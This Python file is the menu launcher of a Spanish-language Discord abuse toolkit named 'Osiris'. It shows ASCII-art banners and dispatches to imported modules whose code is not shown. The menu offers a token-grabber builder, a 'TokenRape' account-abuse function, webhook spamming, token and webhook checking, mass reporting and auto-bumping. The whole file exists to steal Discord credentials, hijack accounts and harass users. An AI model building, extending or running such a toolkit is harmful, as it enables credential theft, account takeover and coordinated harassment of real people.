try:
    import time
    import os
    import sys
    from pyfade import Colors, Fade, Anime
    from os import name, mkdir, system
    from os.path import isdir
    from colorama import Fore
    import modules.massReport as massReport
    import modules.credits as credits
    import modules.tokenGrabber as grabber
    import modules.tokenRape as tokenRape
    import modules.historyClear as historyClear
    import modules.tokenWebhookChecker as checkers
    import modules.webhookSpammer as spammer
    import modules.bumper as bumper
    import modules.serverLookup as serverLookup
    import modules.commands as help
except ImportError as ex:
    def clear():
        os.system("cls" if os.name == 'nt' else "clear")
    print('[+] Instalando requisitos, espere')
    os.system('pip install colorama')
    os.system('pip install pyfade')
    os.system('pip install requests')
    from colorama import Fore
    print(Fore.BLUE + '[+] Requisitos instalados, vuelva a abrir osiris' + Fore.RESET)
    time.sleep(2)
    exit()
def clear():
    system("cls" if name == 'nt' else "clear")
if name == 'nt':
    system("title Osiris & mode 150, 40")


class Client:
    def __init__(self):
        modules = {
            "1" : {"function" : tokenRape.rape, "name" : "TokenRape"},
            "2" : {"function" : spammer.spammer, "name" : "WebhookSpammer"},
            "3" : {"function" : checkers.token, "name" : "TokenChecker"},
            "4" : {"function" : checkers.webhook, "name" : "WebhookChecker"},
            "5" : {"function" : historyClear.clear, "name" : "HistoryClear"},
            "6" : {"function" : bumper.bumper, "name" : "AutoBump"},
            "7" : {"function" : grabber.create_grabber, "name" : "TokenGrabber"},
            "8" : {"function" : serverLookup.fetch_data, "name" : "Server Lookup"},
            "9" : {"function" : massReport.start, "name" : "Mass Report"},
            "10" : {"function" : help.ayuda, "name" : "Ayuda"},
            "11" : {"function" : credits.show_credits, "name" : "Creditos"},
            "12" : {"function" : exit, "name" : "Salir"},
        }
        self.modules = modules

    def main(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        textooo = f"""
                          ▒
                         ░█
                        ███
                       ██ღ█
                      ██ღ▒█      ▒█
                     ██ღ░▒█       ██
                     █ღ░░ღ█      █ღ▒█
                    █▒ღ░▒ღ░█   ██░ღღ█
                   ░█ღ▒░░▒ღ░████ღღღ█
           ░       █▒ღ▒░░░▒ღღღ░ღღღ██     ░█
           ▓█     ░█ღ▒░░░░░░░▒░ღღ██     ▓█░
           ██     █▒ღ░░░░░░░░░░ღ█    ▓▓██
           ██    ██ღ▒░░░░░░░░░ღ██ ░██ღ▒█
          ██ღ█  ██ღ░▒░░░░░░░░░░ღ▓██▒ღღ█
          █ღღ▓██▓ღ░░░▒░░░░░░░░▒░ღღღ░░▓█
         ██ღ▒▒ღღ░░ღღღღ░░▒░░░░ ღღღღ░░ღღღ██
         █ღ▒ღღ█████████ღღ▒░ღ██████████ღ▒█░
        ██ღღ▒████████████ღღ████████████░ღ█▒
        █░ღღ████████████████████████████ღღ█
        █▒ღ██████████████████████████████ღ█
        ██ღღ████████████████████████████ღ██
         ██ღღ██████████████████████████ღ██
          ░██ღღ██████████████████████ღღ██
            ▓██ღ▒██████████████████▒ღ██
             ░███ღ▒████████████▒ღ███
                ▒██ღღ████████▒ღ██
                   ▒██ღ██████ღ██
                    ██ღ████ღ█
                       █ღ██ღ█
                        █ღღ█
                        █ღ█░
                         ██░
        Cargando...
        """
        opts = f"""
                            
                ░█████╗░░██████╗██╗██████╗░██╗░██████╗
                ██╔══██╗██╔════╝██║██╔══██╗██║██╔════╝
                ██║░░██║╚█████╗░██║██████╔╝██║╚█████╗░
                ██║░░██║░╚═══██╗██║██╔══██╗██║░╚═══██╗
                ╚█████╔╝██████╔╝██║██║░░██║██║██████╔╝
                ░╚════╝░╚═════╝░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░
                
                
            [1]    TokenRape            [2]    WebhookSpammer
            [3]    TokenChecker         [4]    WebhookChecker
            [5]    HistoryClear         [6]    AutoBump
            [7]    TokenGrabber         [8]    Server Lookup
            [9]    Mass Report          [10]   Ayuda
            [11]   Creditos             [12]   Salir
            """
        print(Anime.anime((textooo), Colors.blue_to_purple, Fade.Vertical, time=2))
        print(Fade.Vertical(Colors.purple_to_blue, opts))
        opcion = input(Fore.BLUE + f"[>] Opcion: " + Fore.RESET)

        data = self.modules[opcion]

        data["function"]()

        input(Fore.MAGENTA + f"\n [!] Listo, presione enter para salir."+ Fore.RESET)
        self.main()

if __name__ == '__main__':
    client = Client()
    client.main()
